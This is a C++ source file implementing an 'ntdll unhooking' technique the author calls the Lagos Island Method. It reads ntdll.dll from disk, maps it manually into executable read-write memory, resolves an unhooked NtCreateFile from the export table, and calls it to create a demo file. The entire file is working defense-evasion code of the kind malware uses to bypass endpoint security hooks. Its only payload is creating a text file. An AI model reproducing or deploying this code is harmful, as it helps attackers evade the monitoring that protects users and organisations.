//Author: Shaddy43

#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include "Definitions.h"
#include <iostream>
//#include <winnt.h>

LPVOID ReadRAWLibrary(HMODULE, WCHAR[]);
PVOID MapDLLFromBuffer(LPVOID, HMODULE);
FARPROC LoadFunctionAddresses(PVOID, const char*);

int main()
{
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    WCHAR wcFilepath[] = L"\\??\\C:\\Windows\\System32\\ntdll.dll";

    LPVOID pBuffer = ReadRAWLibrary(hNtDll, wcFilepath);
    if (pBuffer == NULL)
        return -1;

    PVOID mBuffer = MapDLLFromBuffer(pBuffer, hNtDll);
    if (mBuffer == NULL)
        return -1;

    // ---------------------------------------------------------------------------
    // Loading unhooked function for NtCreateFile
    std::cout << "[x] Locating unhooked function address" << std::endl;
    FARPROC nt_createfile_address = LoadFunctionAddresses(mBuffer, "NtCreateFile");
    if (nt_createfile_address == NULL)
        return -1;

    std::cout << "[x] Address found for NtCreateFile..." << std::endl;
    // Execute the function. EG NtCreateFile 
    // Assuming you have found NtCreateFile, you can cast it to the appropriate function pointer type and call it.

    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING filePath;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS stat;

    myNtCreateFile fNtCreateFile = (myNtCreateFile)nt_createfile_address;
    WCHAR createFilePath[] = L"\\??\\C:\\Users\\Public\\LagosIsland.txt"; //CreateFile in this path

    // Initialize objectAttributes and objectName here...
    RtlInitUnicodeString(&filePath, createFilePath);
    InitializeObjectAttributes(&objAttr, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    stat = fNtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &objAttr, &ioStatusBlock, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        std::cerr << "Failed to execute NtCreateFile" << std::endl;
        return -1;
    }
    else
    {
        std::wcout << "Success! File Created in >> " << createFilePath << std::endl;
        return 0;
    }
}

LPVOID ReadRAWLibrary(HMODULE hNtDll, WCHAR wcFilepath[])
{
    std::cout << "[x] Initiating ntdll unhooking using Lagos Island Method!!!" << std::endl;
    std::cout << "[x] Reading RAW bytes in memory" << std::endl;

    // Load NtCreateFile function dynamically
    if (hNtDll != nullptr) {
        myNtCreateFile fNtCreateFile = (myNtCreateFile)(GetProcAddress(hNtDll, "NtCreateFile"));
        myNtQueryInformationFile fNtQueryInformationFile = (myNtQueryInformationFile)GetProcAddress(hNtDll, "NtQueryInformationFile");
        myNtReadFile fNtReadFile = (myNtReadFile)GetProcAddress(hNtDll, "NtReadFile");
        HANDLE fileHandle;
        NTSTATUS stat;

        if (!fNtCreateFile || !fNtQueryInformationFile || !fNtReadFile) {
            std::cerr << "Failed to get address of Native calls" << std::endl;
            return NULL;
        }

        OBJECT_ATTRIBUTES objectAttributes;
        IO_STATUS_BLOCK ioStatusBlock;
        UNICODE_STRING fileName;

        // Initialize objectAttributes and objectName here...
        RtlInitUnicodeString(&fileName, wcFilepath); //path to RAW dll
        InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        // using NtCreateFile for getting the handle of dll
        stat = fNtCreateFile(&fileHandle, FILE_GENERIC_READ, &objectAttributes, &ioStatusBlock, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
            FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(stat)){
            std::cerr << "Failed to get handle of library" << std::endl;
            return NULL;
        }

        // using NtQueryInformationFile to get the size of RAW library
        FILE_STANDARD_INFORMATION fileInfo;
        IO_STATUS_BLOCK ioStatus;
        stat = fNtQueryInformationFile(fileHandle, &ioStatus, &fileInfo,
            sizeof(fileInfo), FileStandardInformation);
        if (!NT_SUCCESS(stat)) {
            std::cerr << "Failed to get library size" << stat << std::endl;
            return NULL;
        }

        SIZE_T file_size = fileInfo.EndOfFile.QuadPart;
        std::wcout << "File Path: " << wcFilepath << std::endl;
        std::cout << "File size: " << file_size << " bytes" << std::endl;

        // Allocate buffer using RtlAllocateHeap
        PVOID pBuffer = RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, file_size);
        //PVOID pBuffer = HeapAlloc(GetProcessHeap(), 0, file_size);
        if (pBuffer == NULL) {
            std::cerr << "Failed to allocate buffer" << stat << std::endl;
            return NULL;
        }

        // Read RAW binary bytes into the memory
        PLARGE_INTEGER ByteOffset = nullptr;
        IO_STATUS_BLOCK IoStatusBlock = { 0 };
        stat = fNtReadFile(
            fileHandle,
            nullptr,
            nullptr,
            nullptr,
            &IoStatusBlock,
            pBuffer,
            file_size,
            ByteOffset,
            nullptr // Key
        );

        if (!NT_SUCCESS(stat)) {
            std::cerr << "Failed to Read RAW bytes" << stat << std::endl;
            return NULL;
        }

        std::cout << "RAW bytes read in memory at: " << pBuffer << std::endl;
        return pBuffer;
    }
    else {
        // Handle error
        std::cerr << "Failed to get ntdll handle" << stat << std::endl;
        return NULL;
    }
}

// Function to manually map a DLL into memory
PVOID MapDLLFromBuffer(LPVOID pBuffer, HMODULE hNtDll)
{
    std::cout << "[x] Mapping library from  RAW buffer " << std::endl; 

    if (hNtDll != nullptr) {
        // Importing NtAllocateVirtualMemory
        myNtAllocateVirtualMemory fNtAllocateVirtualMemory = (myNtAllocateVirtualMemory)(GetProcAddress(hNtDll, "NtAllocateVirtualMemory"));
        if (!fNtAllocateVirtualMemory) {
            std::cerr << "Failed to get address of Native calls" << std::endl;
            return NULL;
        }

        // Check for MZ and PE headers
        // pBuffer is assumed to be pointing to the start of the DLL in memory
        IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBuffer;
        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) { // Check for 'MZ'
            return NULL;
        }

        IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)pBuffer + pDosHeader->e_lfanew);
        if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) { // Check for 'PE\0\0'
            return NULL;
        }

        // Allocate a buffer for the dll
        std::cout << "[x] Allocating RWX buffer" << std::endl;
        SIZE_T sizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
        PVOID newBuffer = NULL;
        NTSTATUS status = fNtAllocateVirtualMemory(
            GetCurrentProcess(), //can also use NtCurrentProcess()
            &newBuffer,
            0,
            &sizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!NT_SUCCESS(status)) {
            std::cerr << "Failed to allocate virtual memory" << std::endl;
            return NULL;
        }

        std::cout << "[x] Copying headers/sections into allocated buffer" << std::endl;
        // Copy PE headers
        SIZE_T sizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
        memcpy(newBuffer, pBuffer, sizeOfHeaders);

        // Read the number of sections
        WORD numberOfSections = pNtHeaders->FileHeader.NumberOfSections;

        // Process each section and copy to new allocated RWX buffer
        IMAGE_SECTION_HEADER* pSectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
        for (int i = 0; i < numberOfSections; i++) {
            IMAGE_SECTION_HEADER* pSection = &pSectionHeaders[i];
            PVOID sectionDestination = (PVOID)((BYTE*)newBuffer + pSection->VirtualAddress);
            PVOID sectionSource = (PVOID)((BYTE*)pBuffer + pSection->PointerToRawData);
            SIZE_T sectionSize = pSection->SizeOfRawData;

            memcpy(sectionDestination, sectionSource, sectionSize);
        }
        
        std::cout << "[x] Library Mapped Successfully" << std::endl;
        return newBuffer;
    }
    else
    {
        return NULL;
    }   
}

FARPROC LoadFunctionAddresses(PVOID newBuffer, const char* API)
{
    // Access the export table
    // Assuming newBuffer is the base address where the DLL is loaded
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)newBuffer;
    IMAGE_NT_HEADERS* pNtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)newBuffer + pDosHeader->e_lfanew);

    // Check if it's a valid PE file
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Get the Export Directory
    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) {
        return NULL;
    }

    IMAGE_EXPORT_DIRECTORY* pExportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)newBuffer + exportDir.VirtualAddress);

    // Find the Required Function in the Export Table
    DWORD* namePtr = (DWORD*)((BYTE*)newBuffer + pExportDir->AddressOfNames);
    WORD* ordinalPtr = (WORD*)((BYTE*)newBuffer + pExportDir->AddressOfNameOrdinals);
    DWORD* funcPtr = (DWORD*)((BYTE*)newBuffer + pExportDir->AddressOfFunctions);

    FARPROC pApiAddress = NULL;
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* functionName = (char*)newBuffer + namePtr[i];
        if (strcmp(functionName, API) == 0) {
            DWORD functionRVA = funcPtr[ordinalPtr[i]];
            pApiAddress = (FARPROC)((BYTE*)newBuffer + functionRVA);
            break;
        }
    }
    return pApiAddress;
}